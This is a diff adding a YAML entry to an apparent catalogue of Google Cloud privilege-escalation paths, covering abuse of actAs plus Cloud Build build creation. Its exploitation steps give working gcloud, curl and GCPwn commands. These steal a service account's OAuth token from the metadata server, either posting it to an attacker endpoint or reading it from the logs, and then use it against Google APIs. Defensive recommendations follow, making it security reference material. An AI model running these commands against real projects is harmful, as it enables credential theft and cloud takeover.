@@ -1,0 +1,238 @@
+id: gcp-cloudbuild-001
+name: iam.serviceAccounts.actAs + cloudbuild.builds.create
+category: new-actas
+services:
+- iam
+- cloudbuild
+permissions:
+  required:
+  - permission: iam.serviceAccounts.actAs
+    resourceType: service-account
+    resourceConstraints: Must be granted on the privileged target service account to be pinned to the build; Cloud Build enforces actAs even when specifying the project's default Cloud Build service account
+  - permission: cloudbuild.builds.create
+    resourceType: cloudbuildbuild
+    resourceConstraints: Must be granted at the project level (or on the specific build resource) to submit a new build
+  additional:
+  - permission: cloudbuild.builds.get
+    resourceType: cloudbuildbuild
+    resourceConstraints: Needed only by clients that poll the build's status to know when it finishes; not required via raw REST API when exfil is in a build step that sends the token to an attacker-controlled endpoint (the token is captured before the build is confirmed SUCCESS)
+  - permission: logging.logEntries.list
+    resourceConstraints: Needed only to read the target service account's token back through Cloud Logging after the build step prints it to stdout; an out-of-band exfiltration endpoint (attacker-controlled HTTP listener) does not require this permission
+  - permission: resourcemanager.projects.get
+    resourceConstraints: Required only by `gcloud builds submit` — gcloud calls the Projects.Get API unconditionally before submitting; not needed via the raw Cloud Build v1 REST API
+  - permission: iam.serviceAccounts.list
+    resourceConstraints: Helpful for enumerating service accounts in the project to identify privileged actAs targets
+  - permission: iam.serviceAccounts.getIamPolicy
+    resourceConstraints: Useful for inspecting service account IAM policies to identify accounts on which the attacker holds `iam.serviceAccounts.actAs`
+description: A principal with `iam.serviceAccounts.actAs` on a privileged service account and `cloudbuild.builds.create` can submit a Cloud Build build that pins that service account as the build's service account (`options.serviceAccount`). Build steps execute as that service account; they can retrieve its short-lived OAuth token from the metadata server at the standard GCE metadata endpoint and exfiltrate it to an attacker-controlled endpoint or print it to stdout for later log retrieval. The build config must set `options.logging` to `CLOUD_LOGGING_ONLY` (or specify a `logsBucket`) when using a custom service account, because Cloud Build refuses builds that cannot write logs to the default Cloud Storage bucket when a non-default service account is specified. When using `gcloud builds submit`, gcloud may surface a spurious PERMISSION_DENIED at the end related to the logging configuration, but the build steps still execute and the token is exfiltrated successfully. `iam.serviceAccounts.actAs` is enforced by Cloud Build even when specifying the project's default Cloud Build service account. The attacker then inherits every permission held by the target service account for the duration of the token's validity.
+prerequisites:
+  admin:
+  - A target service account must exist on which the attacker holds `iam.serviceAccounts.actAs`
+  - The target service account must hold `roles/owner`, `roles/editor`, or an equivalent administrative custom role
+  lateral:
+  - A target service account must exist on which the attacker holds `iam.serviceAccounts.actAs`
+  - The target service account must hold permissions that provide useful access beyond the attacker's starting principal
+exploitationSteps:
+  gcloud:
+  - step: 1
+    command: |
+      cat > /tmp/cloudbuild-exfil.yaml << 'YAML'
+      steps:
+        - name: 'alpine'
+          entrypoint: 'sh'
+          args:
+            - '-c'
+            - |
+              TOKEN=$(wget -qO- --header="Metadata-Flavor: Google" \
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+              echo "EXFIL_TOKEN: $TOKEN"
+      options:
+        logging: CLOUD_LOGGING_ONLY
+      YAML
+    description: Write a Cloud Build config whose build step fetches the attached service account's OAuth token from the metadata server and prints it to stdout. `options.logging` must be set to `CLOUD_LOGGING_ONLY` when specifying a custom service account; without it Cloud Build rejects the submission.
+  - step: 2
+    command: |
+      gcloud builds submit --no-source \
+        --config=/tmp/cloudbuild-exfil.yaml \
+        --service-account=projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --region=REGION \
+        --project=PROJECT_ID
+    description: Submit the build pinned to the target service account. gcloud may print a PERMISSION_DENIED warning at the end related to the logging setup, but the build steps execute and the token is captured regardless. The required permissions are `iam.serviceAccounts.actAs` on the target service account and `cloudbuild.builds.create`; `resourcemanager.projects.get` is an unavoidable gcloud-mechanic overhead.
+  - step: 3
+    command: |
+      gcloud logging read \
+        'resource.type="build" AND textPayload:"EXFIL_TOKEN"' \
+        --project=PROJECT_ID \
+        --limit=10 \
+        --format='value(textPayload)'
+    description: Read the exfiltrated token from Cloud Logging. This channel requires the additional `logging.logEntries.list` permission; a build step that sends the token to an attacker-controlled HTTP endpoint does not need it.
+  - step: 4
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_FROM_EXFIL_TOKEN_LOG_ENTRY"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the exfiltrated OAuth bearer token directly against Google APIs to operate as the target service account
+  curl:
+  - step: 1
+    command: |
+      ACCESS_TOKEN=$(gcloud auth print-access-token)
+      EXFIL_STEP='TOKEN=$(wget -qO- --header="Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token) && wget -qO- --post-data="$TOKEN" --header="Content-Type: application/json" https://ATTACKER_ENDPOINT/collect'
+      BUILD_BODY=$(jq -n \
+        --arg sa "projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com" \
+        --arg cmd "$EXFIL_STEP" \
+        '{
+          serviceAccount: $sa,
+          steps: [{name: "alpine", entrypoint: "sh", args: ["-c", $cmd]}],
+          options: {logging: "CLOUD_LOGGING_ONLY"}
+        }')
+    description: Build the Cloud Build request body, setting `serviceAccount` to the full resource name of the target service account and embedding a build step that sends the metadata-server token to an attacker-controlled endpoint. `options.logging` must be set to `CLOUD_LOGGING_ONLY`; without it the API rejects the request when a custom service account is specified. The out-of-band exfil step does not require `logging.logEntries.list`.
+  - step: 2
+    command: |
+      CREATE_RESPONSE=$(curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        "https://cloudbuild.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/builds" \
+        -d "$BUILD_BODY")
+      OPERATION_NAME=$(echo "$CREATE_RESPONSE" | jq -r '.name')
+      BUILD_ID=$(echo "$CREATE_RESPONSE" | jq -r '.metadata.build.id')
+      echo "Build ID: $BUILD_ID  Operation: $OPERATION_NAME"
+    description: Submit the build via the raw Cloud Build v1 REST API. The response is a long-running operation whose `metadata.build.id` is the build ID. `iam.serviceAccounts.actAs` and `cloudbuild.builds.create` are the only permissions required at this step; no gcloud-mechanic overhead applies.
+  - step: 3
+    command: |
+      while true; do
+        STATUS=$(curl -sS \
+          -H "Authorization: Bearer $ACCESS_TOKEN" \
+          "https://cloudbuild.googleapis.com/v1/projects/PROJECT_ID/locations/REGION/builds/$BUILD_ID" \
+          | jq -r '.status')
+        echo "Build status: $STATUS"
+        [[ "$STATUS" == "SUCCESS" || "$STATUS" == "FAILURE" || "$STATUS" == "CANCELLED" ]] && break
+        sleep 10
+      done
+    description: Poll build status with `cloudbuild.builds.get` (additional permission) until the build reaches a terminal state. This step is optional when exfil is out-of-band; the token arrives at the attacker endpoint as soon as the build step executes, before the build is complete.
+  - step: 4
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_RECEIVED_AT_ATTACKER_ENDPOINT"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the token captured at the attacker-controlled endpoint directly against Google APIs to operate as the target service account
+  gcpwn:
+  - step: 1
+    command: |
+      modules run exploit_cloudbuild_build_as_sa \
+        --project-id PROJECT_ID \
+        --target-sa TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --exfil-mode logs \
+        --region REGION
+    description: Use GCPwn's Cloud Build exploitation module to submit a build as the target service account and retrieve its OAuth token from Cloud Build logs. Use `--exfil-mode url --exfil-url https://ATTACKER_ENDPOINT/collect` to send the token to an attacker-controlled endpoint instead, which does not require the additional `logging.logEntries.list` permission.
+  - step: 2
+    command: |
+      EXFILTRATED_TOKEN="TOKEN_FROM_GCPWN_OUTPUT"
+      curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the token recovered by GCPwn directly against Google APIs as the target service account
+recommendation: |
+  High-powered service accounts combined with overly broad `iam.serviceAccounts.actAs` is what makes this privilege escalation path exploitable.
+
+  **Specify a user-managed service account for every build.** Google has updated its guidance for the Cloud Build default service account: depending on your organization's settings, Cloud Build may fall back to the Compute Engine default service account (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`) or the legacy Cloud Build service account (`PROJECT_NUMBER@cloudbuild.gserviceaccount.com`), both of which may carry permissions far broader than any individual build needs. Google now explicitly recommends that you specify your own minimal-permission service account via `options.serviceAccount` rather than accepting the default. Following this recommendation reduces your exposure to both this path (a build submitter with `actAs` on a custom SA) and to the default SA's own over-permissions. See the official guidance in the reference link below.
+
+  - **Avoid privileged service accounts as Cloud Build service accounts** — Very rarely does a Cloud Build job need `roles/editor` or `roles/owner`. Give each build a dedicated service account with only the roles required for its specific tasks (artifact push, container build, deploy trigger).
+  - **Grant `iam.serviceAccounts.actAs` on specific service accounts, not at project scope** — Bind `roles/iam.serviceAccountUser` or a custom role on the individual service account a build submitter needs, never at the project or folder level.
+  - **Separate build submission from privileged identities** — Do not grant a principal both `cloudbuild.builds.create` and `iam.serviceAccounts.actAs` over service accounts that principal should not impersonate.
+  - **Monitor Cloud Audit Logs** for `google.devtools.cloudbuild.v1.CloudBuild.CreateBuild` events that specify a `serviceAccount` field, especially where the submitter does not normally use custom build service accounts.
+  - **Alert on unexpected `options.serviceAccount` values** in build submissions, particularly those specifying service accounts with broad project roles.
+  - **Alert on metadata server access patterns** in Cloud Build logs — build steps that read `computeMetadata/v1/instance/service-accounts/default/token` should be treated as suspicious unless the job explicitly requires raw token access.
+  - Regularly audit which service accounts are used as Cloud Build service accounts, and down-scope any with `roles/editor` or `roles/owner`.
+  - Use IAM Recommender and Policy Analyzer to find unused or overly broad `actAs` grants.
+limitations: |
+  This path provides administrative access only when the pinned service account has administrative project permissions such as `roles/owner`, `roles/editor`, or an equivalent custom role. A narrowly scoped target yields only those permissions, though they may enable further escalation.
+
+  The build must be able to reach the exfiltration channel. VPC Service Controls, egress restrictions, or organization policies that restrict public internet access from Cloud Build workers can block an out-of-band callback; reading the token from Cloud Logging instead requires the additional `logging.logEntries.list` permission. OAuth access tokens are short-lived (typically 1 hour), but the attacker can submit additional builds to refresh them as long as the `actAs` grant persists.
+discoveryAttribution:
+  firstDocumented:
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2020
+    link: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+references:
+- title: Privilege Escalation in Google Cloud Platform - Part 1 (IAM) - Rhino Security Labs
+  url: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+- title: RhinoSecurityLabs/GCP-IAM-Privilege-Escalation - cloudbuild.builds.create exploit script
+  url: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py
+- title: GCPwn Cloud Build exploitation module - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/main/gcpwn/modules/gcp/cloudbuild/exploit/exploit_cloudbuild_build_as_sa.py
+- title: GCPwn CREATE_CLOUDBUILD_BUILD_AS_SA OpenGraph edge - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/main/gcpwn/mappings/og_defined_edges.json
+- title: Specifying a user-specified service account for builds - Google Cloud
+  url: https://cloud.google.com/build/docs/securing-builds/configure-user-specified-service-accounts
+- title: Default Cloud Build service account (legacy vs Compute Engine default; Google recommends user-managed SA) - Google Cloud
+  url: https://cloud.google.com/build/docs/cloud-build-service-account
+relatedPaths:
+- gcp-cloudscheduler-001
+- gcp-cloudscheduler-002
+- gcp-cloudrunserviceimages-001
+- gcp-cloudrunserviceimages-002
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: The attacker holds `iam.serviceAccounts.actAs` on a target service account and the project-level `cloudbuild.builds.create` permission to submit builds. No Cloud Build service account is required to exist in advance.
+  - id: cloud_build
+    label: Submitted Cloud Build Job
+    type: resource
+    description: A new Cloud Build build submitted with `options.serviceAccount` pointing to the target service account. Build steps execute inside a worker with that service account's identity attached. `options.logging` must be set to `CLOUD_LOGGING_ONLY` or a custom `logsBucket`.
+  - id: target_sa
+    label: Pinned Service Account
+    type: principal
+    description: The existing service account pinned to the build via `iam.serviceAccounts.actAs`. All build steps execute as this identity and can access its short-lived OAuth token through the metadata server.
+  - id: exfiltrate_token
+    label: Exfiltrate OAuth Access Token
+    type: payload
+    color: '#99ccff'
+    description: A build step queries the metadata server for the pinned service account's OAuth token and either sends it to an attacker-controlled HTTP endpoint (no additional permission needed) or prints it to stdout for retrieval from Cloud Logging (requires `logging.logEntries.list`).
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    color: '#99ff99'
+    description: The pinned service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role, giving the attacker effective administrative access for the token's lifetime.
+  - id: limited_access
+    label: Limited Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: The pinned service account has useful but non-administrative permissions. The token grants only that narrower access, which may enable further escalation.
+  - id: no_access
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: The pinned service account has no meaningful permissions beyond those already available to the starting principal, so the token provides no material increase in access.
+  edges:
+  - from: start
+    to: cloud_build
+    label: iam.serviceAccounts.actAs + cloudbuild.builds.create
+    description: The attacker submits a Cloud Build job and pins the target service account as the build's runtime identity. `cloudbuild.builds.get` is optional for status polling; `logging.logEntries.list` is optional for the log-based exfil channel.
+  - from: cloud_build
+    to: target_sa
+    label: Build steps run as pinned service account
+    description: Cloud Build runs the submitted build steps inside a worker whose default service account is the pinned target. The metadata server at the standard GCE metadata endpoint exposes the service account's short-lived OAuth token to any process running in the worker.
+  - from: target_sa
+    to: exfiltrate_token
+    label: Build step retrieves token from metadata server
+    description: The malicious build step calls the metadata server and exfiltrates the token — either by sending it to an attacker-controlled HTTP endpoint (no additional permission) or by printing it to stdout for later log retrieval (requires `logging.logEntries.list`).
+  - from: exfiltrate_token
+    to: admin
+    label: If pinned account has administrative permissions
+    branch: A
+    condition: admin
+    description: If the pinned service account has administrative permissions, the attacker can use the token for privileged Google API operations.
+  - from: exfiltrate_token
+    to: limited_access
+    label: If pinned account has narrower permissions
+    branch: B
+    condition: some_permissions
+    description: If the pinned service account has scoped permissions, the bearer token provides those permissions and may enable another escalation path.
+  - from: exfiltrate_token
+    to: no_access
+    label: If pinned account has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: If the pinned service account has no meaningful additional permissions, exfiltrating its token does not produce useful additional access.
